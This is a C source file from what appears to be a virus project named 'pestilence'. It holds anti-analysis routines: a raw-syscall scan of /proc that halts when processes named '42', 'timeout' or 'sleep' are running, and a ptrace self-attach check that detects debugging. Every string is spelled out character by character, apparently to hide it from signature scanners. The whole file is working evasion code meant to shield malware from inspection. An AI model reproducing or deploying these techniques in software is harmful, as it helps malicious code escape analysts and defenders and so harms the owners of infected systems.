#include "pestilence.h"

# define PROC_PATH ((char []){'/','p','r','o','c','/','\0'})

bool	is_forbidden_process(char *process_path) {
	int	fd;
	ssize_t	read_bytes;
	char	buffer[TASK_COMM_LEN + 1];
	char	*tmp_ptr;

	ft_strcpy(process_path + ft_strlen(process_path), ((char []){'/','c','o','m','m','\0'}));
	fd = syscall_wrapper(__NR_open, process_path, O_RDONLY);
	if (fd == -1) {
		ERROR_SYS(((char []){'o','p','e','n','\0'}));
		return false;
	}

	if ((read_bytes = syscall_wrapper(__NR_read, fd, buffer, TASK_COMM_LEN)) == -1) {
		ERROR_SYS(((char []){'r','e','a','d','\0'}));
		syscall_wrapper(__NR_close, fd);
		return false;
	}
	buffer[read_bytes] = '\0';
	if ((tmp_ptr = ft_memchr(buffer, '\n', TASK_COMM_LEN)))
		*tmp_ptr = '\0';
	syscall_wrapper(__NR_close, fd);

	char	*forbidden_process[] = {
		((char []){'4','2','\0'}),
		((char []){'t','i','m','e','o','u','t','\0'}),
		((char []){'s','l','e','e','p','\0'}),
		NULL
	};
	for (uint8_t i = 0; forbidden_process[i]; i++) {
		if (ft_strcmp(forbidden_process[i], buffer) == 0) {
			ERROR(((char []){'f','o','r','b','i','d','d','e','n',' ','p','r','o','c','e','s','s',' ','d','e','t','e','c','t','e','d',' ','!','\0'}));
			return true;
		}
	}
	return false;
}

bool	check_forbidden_process(void) {
	int	fd;
	int	bytes_read;
	int	entry_read;
	struct s_buff_find_binaries	buffers;
	struct linux_dirent64		*dir;
	char	*proc_path = PROC_PATH;

	fd = syscall_wrapper(__NR_open, proc_path, O_RDONLY | O_DIRECTORY);
	if (fd == -1) {
		ERROR_SYS(((char []){'o','p','e','n','1','\0'}));
		return false;
	}

	ft_strcpy(buffers.file_path, proc_path);
	while (42) {
		if ((bytes_read = syscall_wrapper(__NR_getdents64, fd, buffers.getdents64, sizeof(buffers.getdents64))) == -1) {
			ERROR_SYS(((char []){'g','e','t','d','e','n','t','s','6','4','\0'}));
			syscall_wrapper(__NR_close, fd);
			return false;
		}
		if (bytes_read == 0)
			break;

		for (entry_read = 0; entry_read < bytes_read;) {
			dir = (struct linux_dirent64 *)(buffers.getdents64 + entry_read);
			if (dir->d_type == DT_DIR) {
				if (ft_isdigit(dir->d_name[0]) && ft_strcmp((char []){'.','\0'}, dir->d_name) != 0 && ft_strcmp((char []){'.','.','\0'}, dir->d_name) != 0) {
					ft_strcpy(buffers.file_path + sizeof(PROC_PATH) - 1, dir->d_name);
					if (is_forbidden_process(buffers.file_path)) {
						syscall_wrapper(__NR_close, fd);
						return false;
					}
				}
			}
			entry_read += dir->d_reclen;
		}
	}
	syscall_wrapper(__NR_close, fd);
	return true;
}

bool	check_debugging(void) {
	if (syscall_wrapper(__NR_ptrace, PTRACE_TRACEME, 0, 1, 0) == -1) {
		ERROR(((char []){'p','r','o','c','e','s','s',' ','b','e','i','n','g',' ','t','r','a','c','e','d','\0'}));
		return false;
	}
	return true;
}
